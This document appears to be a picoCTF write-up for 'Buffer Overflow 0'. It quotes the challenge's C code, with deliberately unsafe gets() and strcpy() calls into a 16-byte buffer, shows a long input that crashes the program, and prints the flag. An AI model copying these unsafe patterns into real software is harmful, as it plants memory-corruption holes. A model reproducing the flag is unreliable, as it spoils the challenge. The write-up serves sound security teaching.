# Writeup: Buffer Overflow 0

## Introduction

Looking at the code we can see that the flag is printed when the program detects a segmentation fault. The signal function designates the sigsegv handler function as the function to be triggered if a segmentation fault were to occur which is the function that prints out the flag. In order to trigger this we can overflow the buffer in the vuln function by passing an input greater than 16 characters to the buffer in the main function after which the input will be copied to the buffer in the vuln function which will cause a buffer overflow triggering the segmentation fault.

```
    void sigsegv_handler(int sig) {
      printf("%s\n", flag);
      fflush(stdout);
      exit(1);
    }

    void vuln(char *input){
      char buf2[16];
      strcpy(buf2, input);
    }

    int main(int argc, char **argv){

      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
      }

      fgets(flag,FLAGSIZE_MAX,f);
      signal(SIGSEGV, sigsegv_handler); // Set up signal handler

      gid_t gid = getegid();
      setresgid(gid, gid, gid);


      printf("Input: ");
      fflush(stdout);
      char buf1[100];
      gets(buf1);
      vuln(buf1);
      printf("The program will exit now\n");
      return 0;
    }
        
```

## Results

Below is the result of overflowing buf2 with over 16 characters:

```
    Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

Finally we have our flag!
